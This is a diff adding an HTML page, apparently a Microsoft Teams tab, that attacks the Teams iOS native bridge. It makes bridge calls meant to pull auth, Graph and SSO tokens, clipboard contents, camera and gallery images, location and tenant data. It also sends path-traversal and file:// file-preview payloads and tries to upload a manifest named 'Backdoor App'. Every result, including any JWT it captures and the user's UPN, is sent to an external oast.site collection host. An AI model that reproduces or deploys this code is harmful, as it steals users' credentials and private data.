@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bridge Test</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Cascadia Code','SF Mono',monospace; background:#0d1117; color:#c9d1d9; padding:6px; font-size:10px; }
+  #out { background:#161b22; padding:6px; border-radius:6px; white-space:pre-wrap; word-break:break-all; max-height:70vh; overflow-y:auto; }
+  .ok { color:#3fb950; } .fail { color:#f85149; } .warn { color:#d29922; } .info { color:#58a6ff; } .crit { color:#f0883e; font-weight:bold; }
+  .section { margin:4px 0 2px; padding:3px; background:#21262d; border-radius:4px; }
+  .section b { color:#58a6ff; font-size:11px; }
+  button { background:#21262d; color:#c9d1d9; border:1px solid #30363d; padding:4px 8px; margin:1px; border-radius:4px; cursor:pointer; font-size:9px; }
+  .g1 button { border-color:#f0883e; color:#f0883e; }
+  .g2 button { border-color:#3fb950; color:#3fb950; }
+  .g3 button { border-color:#d29922; color:#d29922; }
+  .g4 button { border-color:#bc8cff; color:#bc8cff; }
+</style>
+</head>
+<body>
+
+<div class="section"><b>NATIVE BRIDGE (nativeInterface)</b></div>
+<div class="g1">
+  <button onclick="probeNativeInterface()">NI1: Enumerate</button>
+  <button onclick="bridgeGetToken()">NI2: getAuthToken</button>
+  <button onclick="bridgeClipboard()">NI3: clipboard</button>
+  <button onclick="bridgeCustomMsg()">NI4: sendCustomMsg</button>
+  <button onclick="bridgeInternalFuncs()">NI5: internal funcs</button>
+</div>
+
+<div class="section"><b>FILE PREVIEW (RCE surface)</b></div>
+<div class="g2">
+  <button onclick="filePreview(1)">FP1: HTML file</button>
+  <button onclick="filePreview(2)">FP2: SVG file</button>
+  <button onclick="filePreview(3)">FP3: MIME mismatch</button>
+  <button onclick="filePreview(4)">FP4: path traversal</button>
+  <button onclick="filePreview(5)">FP5: file:// URL</button>
+</div>
+
+<div class="section"><b>MEDIA / CAMERA / UPLOAD</b></div>
+<div class="g3">
+  <button onclick="mediaTest(1)">MD1: captureImage</button>
+  <button onclick="mediaTest(2)">MD2: selectMedia</button>
+  <button onclick="mediaTest(3)">MD3: visualMedia</button>
+  <button onclick="mediaTest(4)">MD4: uploadCustomApp</button>
+  <button onclick="mediaTest(5)">MD5: scanBarCode</button>
+</div>
+
+<div class="section"><b>EXTRAS</b></div>
+<div class="g4">
+  <button onclick="dialogMsg()">DM1: dialog msg channel</button>
+  <button onclick="permTest()">PM1: permissions</button>
+  <button onclick="copyOut()">COPY</button>
+</div>
+
+<div id="out" style="margin-top:4px;"></div>
+
+<script>
+var el = document.getElementById('out');
+var CTX = null;
+var C = 'o21c1mes8ezi4ox5wz9mmhhpikwlgcwi8.oast.site';
+var BXSS = 'xss.report/c/ztlsavior';
+var msgId = 1000;
+var responses = {};
+
+function log(m, cls) {
+  var span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = m + '\n';
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
+
+function ex(path, data) {
+  var p = Object.keys(data).map(function(k) {
+    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 400));
+  }).join('&');
+  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
+    new Image().src = 'https://' + C + '/' + path + '?' + p;
+  });
+}
+
+function copyOut() {
+  navigator.clipboard.writeText(el.textContent).catch(function(){});
+  log('[copied]', 'info');
+}
+
+function safStr(obj, d) {
+  if (d === undefined) d = 2;
+  if (d <= 0) return String(obj);
+  if (obj === null) return 'null';
+  if (obj === undefined) return 'undefined';
+  var t = typeof obj;
+  if (t === 'string') return '"' + obj.substring(0, 200) + '"';
+  if (t === 'number' || t === 'boolean') return String(obj);
+  if (t === 'function') return '[fn ' + (obj.name || '?') + ']';
+  if (Array.isArray(obj)) return '[' + obj.slice(0,5).map(function(v){return safStr(v,d-1)}).join(',') + ']';
+  if (t === 'object') {
+    var k; try{k=Object.getOwnPropertyNames(obj)}catch(e){try{k=Object.keys(obj)}catch(e2){return '[obj]'}}
+    return '{' + k.slice(0,15).map(function(p){try{return p+':'+safStr(obj[p],d-1)}catch(e){return p+':err'}}).join(', ') + '}';
+  }
+  return String(obj);
+}
+
+// ================================================================
+// NATIVE BRIDGE CORE — Send message via framelessPostMessage
+// This is the REAL channel Teams iOS uses internally
+// ================================================================
+
+function bridgeSend(func, args, callback) {
+  var id = msgId++;
+  var request = {
+    id: id,
+    func: func,
+    args: args || [],
+    timestamp: Date.now(),
+    apiVersionTag: 'v2_' + func
+  };
+
+  if (callback) {
+    responses[id] = callback;
+  }
+
+  // Try nativeInterface first (iOS frameless)
+  if (window.nativeInterface && window.nativeInterface.framelessPostMessage) {
+    try {
+      window.nativeInterface.framelessPostMessage(JSON.stringify(request));
+      log('  >> bridge(' + func + ') id=' + id + ' sent via nativeInterface', 'ok');
+      return true;
+    } catch(e) {
+      log('  >> bridge(' + func + ') nativeInterface error: ' + e.message, 'fail');
+    }
+  }
+
+  // Fallback: try parent postMessage
+  if (window.parent && window.parent !== window) {
+    try {
+      window.parent.postMessage(request, '*');
+      log('  >> bridge(' + func + ') id=' + id + ' sent via postMessage', 'info');
+      return true;
+    } catch(e) {}
+  }
+
+  log('  >> bridge(' + func + ') no transport available', 'fail');
+  return false;
+}
+
+// Hook onNativeMessage to capture ALL responses from native host
+var origOnNativeMessage = window.onNativeMessage;
+window.onNativeMessage = function(evt) {
+  var data;
+  try {
+    data = typeof evt === 'string' ? JSON.parse(evt) : (evt.data ? (typeof evt.data === 'string' ? JSON.parse(evt.data) : evt.data) : evt);
+  } catch(e) {
+    data = evt;
+  }
+
+  log('[NATIVE RESPONSE] ' + safStr(data, 3).substring(0, 500), 'crit');
+  ex('t14-native-response', { data: safStr(data, 3).substring(0, 400) });
+
+  // Route to callback if we have one
+  if (data && data.id !== undefined && responses[data.id]) {
+    responses[data.id](data.args || data);
+    delete responses[data.id];
+  }
+
+  // Also check for tokens in response
+  var str = JSON.stringify(data);
+  if (str && str.indexOf('eyJ') !== -1) {
+    var jwt = str.match(/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
+    if (jwt) {
+      log('*** JWT IN RESPONSE: ' + jwt[0].substring(0, 80) + '...', 'crit');
+      try {
+        var payload = JSON.parse(atob(jwt[0].split('.')[1].replace(/-/g,'+').replace(/_/g,'/')));
+        log('  aud: ' + payload.aud + ' scp: ' + (payload.scp || 'N/A'), 'crit');
+        ex('t14-jwt-stolen', { aud: payload.aud, scp: payload.scp, upn: payload.upn, token: jwt[0].substring(0, 200) });
+      } catch(e) {}
+    }
+  }
+
+  // Forward to original handler if exists
+  if (origOnNativeMessage) origOnNativeMessage(evt);
+};
+
+// Also intercept postMessage responses
+window.addEventListener('message', function(e) {
+  if (e.origin === window.location.origin) return;
+  log('[postMessage from ' + e.origin + '] ' + safStr(e.data, 2).substring(0, 300), 'crit');
+  ex('t14-postmsg', { origin: e.origin, data: safStr(e.data, 2).substring(0, 300) });
+});
+
+// Init
+(async function() {
+  try {
+    await microsoftTeams.app.initialize();
+    CTX = await microsoftTeams.app.getContext();
+    log('OK: ' + CTX.user.userPrincipalName + ' | ' + CTX.app.host.clientType, 'ok');
+    log('Frame: ' + (CTX.page ? CTX.page.frameContext : 'N/A') + ' | isFrameless: check NI1', 'info');
+  } catch(e) {
+    log('SDK init: ' + e.message, 'fail');
+  }
+})();
+
+// ================================================================
+// NI1: ENUMERATE nativeInterface
+// ================================================================
+function probeNativeInterface() {
+  log('\n' + '='.repeat(50), 'info');
+  log('NI1: NATIVE INTERFACE ENUMERATION', 'info');
+  log('='.repeat(50), 'info');
+
+  // Check window.nativeInterface
+  log('\n--- window.nativeInterface ---', 'info');
+  if (window.nativeInterface) {
+    log('EXISTS! typeof: ' + typeof window.nativeInterface, 'crit');
+    try {
+      var keys = Object.getOwnPropertyNames(window.nativeInterface);
+      log('OwnPropertyNames: ' + (keys.length > 0 ? keys.join(', ') : '(empty)'), keys.length > 0 ? 'crit' : 'warn');
+    } catch(e) { log('OwnPropertyNames error: ' + e.message, 'fail'); }
+    try {
+      var keys2 = Object.keys(window.nativeInterface);
+      if (keys2.length > 0) log('Object.keys: ' + keys2.join(', '), 'crit');
+    } catch(e) {}
+    try {
+      var proto = Object.getPrototypeOf(window.nativeInterface);
+      if (proto) {
+        var pkeys = Object.getOwnPropertyNames(proto);
+        log('Prototype: ' + pkeys.join(', '), pkeys.length > 0 ? 'crit' : 'info');
+      }
+    } catch(e) {}
+
+    // Check framelessPostMessage
+    if (typeof window.nativeInterface.framelessPostMessage === 'function') {
+      log('framelessPostMessage: FUNCTION EXISTS', 'crit');
+      ex('t14-ni-found', { framelessPostMessage: 'true' });
+    } else {
+      log('framelessPostMessage: ' + typeof window.nativeInterface.framelessPostMessage, 'warn');
+    }
+  } else {
+    log('NOT FOUND', 'fail');
+  }
+
+  // Check window.onNativeMessage
+  log('\n--- window.onNativeMessage ---', 'info');
+  log('typeof: ' + typeof window.onNativeMessage, window.onNativeMessage ? 'crit' : 'warn');
+
+  // Check window.teams (found before)
+  log('\n--- window.teams ---', 'info');
+  if (window.teams) {
+    log('EXISTS: ' + safStr(window.teams, 2), 'crit');
+    if (window.teams.messageHandlers) {
+      log('teams.messageHandlers: ' + safStr(window.teams.messageHandlers, 2), 'crit');
+      // Try framelessPostMessage on it
+      if (typeof window.teams.messageHandlers.framelessPostMessage === 'function') {
+        log('teams.messageHandlers.framelessPostMessage EXISTS!', 'crit');
+      }
+      if (typeof window.teams.messageHandlers.postMessage === 'function') {
+        log('teams.messageHandlers.postMessage EXISTS!', 'crit');
+      }
+    }
+  }
+
+  // Check GlobalVars equivalent
+  log('\n--- SDK internal state ---', 'info');
+  try {
+    if (microsoftTeams._uninitialize) {
+      log('_uninitialize exists (can reset SDK)', 'info');
+    }
+  } catch(e) {}
+
+  // Deep scan for any object with framelessPostMessage
+  log('\n--- Deep scan for bridge objects ---', 'info');
+  var bridgeNames = [
+    'nativeInterface', 'webkit', 'teams', 'TeamsNative',
+    'microsoftTeamsNative', 'msteamsNative', 'teamsBridge',
+    'nativeBridge', 'appBridge', 'hostBridge', 'mobileBridge',
+  ];
+  for (var bn of bridgeNames) {
+    try {
+      var obj = window[bn];
+      if (obj && typeof obj === 'object') {
+        var hasFPM = typeof obj.framelessPostMessage === 'function';
+        var hasPM = typeof obj.postMessage === 'function';
+        if (hasFPM || hasPM) {
+          log('  window.' + bn + ': framelessPostMessage=' + hasFPM + ' postMessage=' + hasPM, 'crit');
+          ex('t14-bridge-found', { name: bn, fpm: hasFPM, pm: hasPM });
+        }
+      }
+    } catch(e) {}
+  }
+}
+
+// ================================================================
+// NI2: GET AUTH TOKEN VIA NATIVE BRIDGE
+// If we bypass the SDK check by calling directly...
+// ================================================================
+function bridgeGetToken() {
+  log('\n' + '='.repeat(50), 'info');
+  log('NI2: AUTH TOKEN VIA NATIVE BRIDGE', 'info');
+  log('='.repeat(50), 'info');
+
+  // A) Direct bridge call to authentication.getAuthToken
+  log('\n--- A: authentication.getAuthToken ---', 'info');
+  bridgeSend('authentication.getAuthToken', [{ resource: 'https://graph.microsoft.com' }], function(args) {
+    log('RESPONSE: ' + safStr(args, 3).substring(0, 500), 'crit');
+  });
+
+  // B) Alternative: getAuthToken with no resource
+  log('\n--- B: authentication.getAuthToken (no resource) ---', 'info');
+  bridgeSend('authentication.getAuthToken', [{}], function(args) {
+    log('RESPONSE: ' + safStr(args, 3).substring(0, 500), 'crit');
+  });
+
+  // C) Direct internal func name
+  log('\n--- C: getAuthToken (short name) ---', 'info');
+  bridgeSend('getAuthToken', [], function(args) {
+    log('RESPONSE: ' + safStr(args, 3).substring(0, 500), 'crit');
+  });
+
+  // D) Try getting the Skype token
+  log('\n--- D: getConfigSetting (accessToken) ---', 'info');
+  bridgeSend('getConfigSetting', ['accessToken'], function(args) {
+    log('RESPONSE: ' + safStr(args, 3).substring(0, 500), 'crit');
+  });
+
+  // E) Skype token
+  log('\n--- E: getConfigSetting (skypeToken) ---', 'info');
+  bridgeSend('getConfigSetting', ['skypeToken'], function(args) {
+    log('RESPONSE: ' + safStr(args, 3).substring(0, 500), 'crit');
+  });
+
+  // F) Try authentication.authenticate with our URL
+  log('\n--- F: authentication.authenticate ---', 'info');
+  bridgeSend('authentication.authenticate', [{
+    url: 'https://' + C + '/ni2-auth-bridge?upn=' + encodeURIComponent(CTX ? CTX.user.userPrincipalName : ''),
+    width: 600, height: 535
+  }], function(args) {
+    log('RESPONSE: ' + safStr(args, 3).substring(0, 500), 'crit');
+  });
+}
+
+// ================================================================
+// NI3: CLIPBOARD VIA NATIVE BRIDGE
+// SDK says isSupported=false but bridge might still work
+// ================================================================
+function bridgeClipboard() {
+  log('\n' + '='.repeat(50), 'info');
+  log('NI3: CLIPBOARD VIA NATIVE BRIDGE', 'info');
+  log('='.repeat(50), 'info');
+
+  // A) clipboard.readFromClipboard — returns {mimeType, content(base64)}
+  log('\n--- A: clipboard.readFromClipboard ---', 'info');
+  bridgeSend('clipboard.readFromClipboard', [], function(args) {
+    log('CLIPBOARD RESPONSE: ' + safStr(args, 3).substring(0, 500), 'crit');
+    ex('t14-clipboard', { data: safStr(args, 3).substring(0, 400) });
+  });
+
+  // B) Also try the web API again for comparison
+  log('\n--- B: navigator.clipboard.readText ---', 'info');
+  navigator.clipboard.readText().then(function(text) {
+    if (text && text.length > 0) {
+      log('WEB CLIPBOARD: ' + text.substring(0, 200), 'crit');
+      ex('t14-web-clipboard', { text: text.substring(0, 400) });
+    } else {
+      log('WEB CLIPBOARD: (empty)', 'warn');
+    }
+  }).catch(function(e) {
+    log('WEB CLIPBOARD error: ' + e.message, 'fail');
+  });
+}
+
+// ================================================================
+// NI4: SEND CUSTOM MESSAGE — ARBITRARY FUNC TO HOST
+// ================================================================
+function bridgeCustomMsg() {
+  log('\n' + '='.repeat(50), 'info');
+  log('NI4: SEND CUSTOM MESSAGE (arbitrary func)', 'info');
+  log('='.repeat(50), 'info');
+
+  // Using the private API sendCustomMessage format
+  var funcs = [
+    { func: 'getUserJoinedTeams', args: [] },
+    { func: 'getChatMembers', args: [] },
+    { func: 'getContext', args: [] },
+    { func: 'getConfigSetting', args: ['authToken'] },
+    { func: 'getConfigSetting', args: ['bearerToken'] },
+    { func: 'getConfigSetting', args: ['graphToken'] },
+    { func: 'getConfigSetting', args: ['ssoToken'] },
+    { func: 'getConfigSetting', args: ['sessionId'] },
+    { func: 'getConfigSetting', args: ['tenantId'] },
+    { func: 'readFromClipboard', args: [] },
+    { func: 'permissions.has', args: ['media'] },
+    { func: 'permissions.has', args: ['geolocation'] },
+    { func: 'permissions.has', args: ['notifications'] },
+    { func: 'getLocation', args: [{ allowChooseLocation: false, showMap: false }] },
+    { func: 'executeDeepLink', args: ['https://' + C + '/ni4-deeplink'] },
+  ];
+
+  for (var i = 0; i < funcs.length; i++) {
+    (function(f, idx) {
+      bridgeSend(f.func, f.args, function(args) {
+        log('  [' + f.func + '] RESPONSE: ' + safStr(args, 3).substring(0, 300), 'crit');
+        ex('t14-custom-' + f.func.replace(/\./g, '-'), { data: safStr(args, 3).substring(0, 400) });
+      });
+    })(funcs[i], i);
+  }
+}
+
+// ================================================================
+// NI5: INTERNAL FUNCTIONS — sensitive SDK internals
+// ================================================================
+function bridgeInternalFuncs() {
+  log('\n' + '='.repeat(50), 'info');
+  log('NI5: INTERNAL FUNCTIONS VIA BRIDGE', 'info');
+  log('='.repeat(50), 'info');
+
+  var internals = [
+    { func: 'nestedAppAuth.execute', args: [{ messageType: 'NestedAppAuth', method: 'GetToken', requestId: 'x', sendTime: Date.now(), clientId: '5e3ce6c0-2b1f-4285-8d4b-75ee78787346' }] },
+    { func: 'nestedAppAuth.getToken', args: [{ scopes: ['User.Read', 'Mail.Read'] }] },
+    { func: 'authentication.getToken', args: [] },
+    { func: 'tasks.getTaskInfo', args: [] },
+    { func: 'log.request', args: ['getLog', []] },
+    { func: 'getUserInfo', args: [] },
+    { func: 'getSettings', args: [] },
+    { func: 'getTenantInfo', args: [] },
+    { func: 'app.lifecycle.resume', args: [] },
+    { func: 'messageChannels.telemetry.getChannel', args: [] },
+    { func: 'messageChannels.dataLayer.getChannel', args: [] },
+  ];
+
+  for (var i = 0; i < internals.length; i++) {
+    (function(f) {
+      bridgeSend(f.func, f.args, function(args) {
+        log('  [' + f.func + '] RESPONSE: ' + safStr(args, 3).substring(0, 300), 'crit');
+        ex('t14-internal-' + f.func.replace(/\./g, '-'), { data: safStr(args, 3).substring(0, 400) });
+      });
+    })(internals[i]);
+  }
+}
+
+// ================================================================
+// FILE PREVIEW — RCE SURFACE
+// openFilePreview sends 20 params to native file handler
+// ================================================================
+function filePreview(n) {
+  log('\n' + '='.repeat(50), 'info');
+  log('FP' + n + ': FILE PREVIEW TEST', 'info');
+  log('='.repeat(50), 'info');
+
+  var previews = {
+    // FP1: HTML file — will iOS QuickLook render it with JS?
+    1: {
+      entityId: 'fp1-' + Date.now(),
+      title: 'Report.html',
+      description: 'Quarterly Report',
+      type: 'html',
+      objectUrl: 'https://' + C + '/fp1-preview.html',
+      downloadUrl: 'https://' + C + '/fp1-download.html',
+      webPreviewUrl: 'https://' + C + '/fp1-webpreview?type=html',
+      webEditUrl: '',
+      baseUrl: 'https://' + C,
+      editFile: false,
+      subEntityId: '',
+      viewerAction: 'view',
+      fileOpenPreference: 0,
+      conversationId: '',
+      sizeInBytes: 1024,
+    },
+    // FP2: SVG file — SVG can contain JS, will it execute?
+    2: {
+      entityId: 'fp2-' + Date.now(),
+      title: 'diagram.svg',
+      description: 'Architecture diagram',
+      type: 'svg',
+      objectUrl: 'https://' + C + '/fp2-preview.svg',
+      downloadUrl: 'https://' + C + '/fp2-download.svg',
+      webPreviewUrl: 'https://' + C + '/fp2-webpreview?type=svg',
+      baseUrl: 'https://' + C,
+      editFile: false,
+      viewerAction: 'view',
+      fileOpenPreference: 0,
+      sizeInBytes: 512,
+    },
+    // FP3: MIME mismatch — type says PDF but URL serves HTML
+    3: {
+      entityId: 'fp3-' + Date.now(),
+      title: 'document.pdf',
+      description: 'Important document',
+      type: 'pdf',
+      objectUrl: 'https://' + C + '/fp3-fakepdf.html',
+      downloadUrl: 'https://' + C + '/fp3-fakepdf-dl.html',
+      webPreviewUrl: 'https://' + C + '/fp3-webpreview?type=pdf-mismatch',
+      baseUrl: 'https://' + C,
+      editFile: false,
+      viewerAction: 'view',
+      fileOpenPreference: 0,
+      sizeInBytes: 2048,
+    },
+    // FP4: Path traversal in title/entityId
+    4: {
+      entityId: '../../../etc/passwd',
+      title: '../../../../tmp/pwned.txt',
+      description: 'test',
+      type: 'txt',
+      objectUrl: 'https://' + C + '/fp4-traversal',
+      downloadUrl: 'https://' + C + '/fp4-traversal-dl',
+      webPreviewUrl: '',
+      baseUrl: 'https://' + C,
+      editFile: false,
+      viewerAction: 'view',
+      fileOpenPreference: 0,
+      sizeInBytes: 100,
+    },
+    // FP5: file:// URL — local file access
+    5: {
+      entityId: 'fp5-' + Date.now(),
+      title: 'config.txt',
+      description: 'Configuration',
+      type: 'txt',
+      objectUrl: 'file:///etc/hosts',
+      downloadUrl: 'file:///etc/passwd',
+      webPreviewUrl: 'file:///var/mobile/Library/Preferences/',
+      baseUrl: 'file:///var/mobile/',
+      editFile: false,
+      viewerAction: 'view',
+      fileOpenPreference: 0,
+      sizeInBytes: 256,
+    },
+  };
+
+  var fp = previews[n];
+  if (!fp) { log('Invalid test', 'fail'); return; }
+
+  // Send via bridge (same format as SDK openFilePreview)
+  var params = [
+    fp.entityId, fp.title, fp.description, fp.type,
+    fp.objectUrl, fp.downloadUrl, fp.webPreviewUrl || '',
+    fp.webEditUrl || '', fp.baseUrl || '', fp.editFile || false,
+    fp.subEntityId || '', fp.viewerAction || 'view',
+    fp.fileOpenPreference || 0, fp.conversationId || '',
+    fp.sizeInBytes || 0, '', '', '', fp.shareUrl || '', ''
+  ];
+
+  log('Sending openFilePreview:', 'info');
+  log('  title: ' + fp.title, 'info');
+  log('  type: ' + fp.type, 'info');
+  log('  objectUrl: ' + fp.objectUrl, 'info');
+  log('  downloadUrl: ' + fp.downloadUrl, 'info');
+
+  bridgeSend('openFilePreview', params, function(args) {
+    log('PREVIEW RESPONSE: ' + safStr(args, 3).substring(0, 300), 'crit');
+    ex('t14-fp' + n + '-response', { data: safStr(args, 3).substring(0, 400) });
+  });
+
+  ex('t14-fp' + n + '-sent', { type: fp.type, objectUrl: fp.objectUrl.substring(0, 200) });
+}
+
+// ================================================================
+// MEDIA / CAMERA / UPLOAD
+// ================================================================
+function mediaTest(n) {
+  log('\n' + '='.repeat(50), 'info');
+  log('MD' + n + ': MEDIA TEST', 'info');
+  log('='.repeat(50), 'info');
+
+  switch(n) {
+    // MD1: captureImage via bridge
+    case 1:
+      log('--- captureImage via bridge ---', 'info');
+      bridgeSend('captureImage', [], function(args) {
+        log('CAPTURE RESPONSE: ' + safStr(args, 2).substring(0, 300), 'crit');
+        // args should contain base64 images
+        var str = JSON.stringify(args);
+        if (str && (str.indexOf('base64') !== -1 || str.indexOf('data:image') !== -1 || str.length > 1000)) {
+          log('*** IMAGE DATA IN RESPONSE (' + str.length + ' chars)', 'crit');
+          ex('t14-capture-image', { size: str.length, preview: str.substring(0, 300) });
+        }
+      });
+      break;
+
+    // MD2: selectMedia — gallery access
+    case 2:
+      log('--- selectMedia via bridge ---', 'info');
+      bridgeSend('selectMedia', [{
+        mediaType: 1, // Image
+        maxMediaCount: 1,
+        imageProps: { sources: [2], startMode: 1 } // Gallery source
+      }], function(args) {
+        log('SELECT RESPONSE: ' + safStr(args, 2).substring(0, 300), 'crit');
+        var str = JSON.stringify(args);
+        if (str && str.length > 500) {
+          log('*** MEDIA DATA (' + str.length + ' chars)', 'crit');
+          ex('t14-select-media', { size: str.length, preview: str.substring(0, 300) });
+        }
+      });
+      break;
+
+    // MD3: visualMedia.image.captureImages
+    case 3:
+      log('--- visualMedia.image.captureImages via bridge ---', 'info');
+      bridgeSend('visualMedia.image.captureImages', [{ maxVisualMediaCount: 1 }], function(args) {
+        log('VISUAL CAPTURE: ' + safStr(args, 2).substring(0, 300), 'crit');
+      });
+      break;
+
+    // MD4: uploadCustomApp — upload malicious app manifest
+    case 4:
+      log('--- uploadCustomApp via bridge ---', 'info');
+      // Create a minimal Teams app manifest
+      var manifest = {
+        "$schema": "https://developer.microsoft.com/en-us/json-schemas/teams/v1.16/MicrosoftTeams.schema.json",
+        "manifestVersion": "1.16",
+        "version": "1.0.0",
+        "id": "00000000-0000-0000-0000-000000000001",
+        "developer": { "name": "Test", "websiteUrl": "https://" + C, "privacyUrl": "https://" + C, "termsOfUseUrl": "https://" + C },
+        "name": { "short": "Backdoor", "full": "Backdoor App" },
+        "description": { "short": "test", "full": "test" },
+        "icons": { "color": "color.png", "outline": "outline.png" },
+        "accentColor": "#FFFFFF",
+        "staticTabs": [{ "entityId": "home", "name": "Home", "contentUrl": "https://" + C + "/backdoor", "scopes": ["personal"] }],
+        "permissions": ["identity", "messageTeamMembers"],
+        "validDomains": [C]
+      };
+      var manifestStr = JSON.stringify(manifest);
+      var manifestBlob = new Blob([manifestStr], { type: 'application/json' });
+
+      bridgeSend('uploadCustomApp', [manifestBlob], function(args) {
+        log('UPLOAD RESPONSE: ' + safStr(args, 3).substring(0, 300), 'crit');
+        ex('t14-upload-app', { data: safStr(args, 3).substring(0, 400) });
+      });
+      break;
+
+    // MD5: scanBarCode — camera access
+    case 5:
+      log('--- scanBarCode via bridge ---', 'info');
+      bridgeSend('media.scanBarCode', [{ timeOutIntervalInSec: 10 }], function(args) {
+        log('BARCODE RESPONSE: ' + safStr(args, 2).substring(0, 300), 'crit');
+        ex('t14-barcode', { data: safStr(args, 2).substring(0, 300) });
+      });
+      break;
+  }
+}
+
+// ================================================================
+// DIALOG MESSAGE CHANNEL — tab ↔ dialog communication
+// ================================================================
+function dialogMsg() {
+  log('\n' + '='.repeat(50), 'info');
+  log('DM1: DIALOG MESSAGE CHANNEL', 'info');
+  log('='.repeat(50), 'info');
+
+  // A) messageForParent — send message FROM dialog context (we're in tab, but try anyway)
+  log('\n--- A: messageForParent/messageForChild ---', 'info');
+  bridgeSend('messageForParent', ['test-message-from-tab'], function(args) {
+    log('messageForParent response: ' + safStr(args, 2), 'warn');
+  });
+
+  bridgeSend('messageForChild', ['test-message-for-child'], function(args) {
+    log('messageForChild response: ' + safStr(args, 2), 'warn');
+  });
+
+  // B) Try to register as a dialog and receive messages meant for dialogs
+  bridgeSend('tasks.startTask', [{
+    url: 'https://' + C + '/dm1-dialog-bridge?upn=' + encodeURIComponent(CTX ? CTX.user.userPrincipalName : ''),
+    title: 'Update',
+    height: 300,
+    width: 400
+  }], function(args) {
+    log('startTask response: ' + safStr(args, 3).substring(0, 300), 'warn');
+  });
+}
+
+// ================================================================
+// PERMISSIONS TEST
+// ================================================================
+function permTest() {
+  log('\n' + '='.repeat(50), 'info');
+  log('PM1: PERMISSIONS VIA BRIDGE', 'info');
+  log('='.repeat(50), 'info');
+
+  var perms = ['media', 'geolocation', 'notifications', 'openExternal', 'clipboard'];
+  for (var p of perms) {
+    bridgeSend('permissions.has', [p], function(args) {
+      log('  has(' + p + '): ' + safStr(args, 2), args && args[0] ? 'crit' : 'info');
+    });
+    bridgeSend('permissions.request', [p], function(args) {
+      log('  request(' + p + '): ' + safStr(args, 2), 'warn');
+    });
+  }
+}
+</script>
+</body>
+</html>
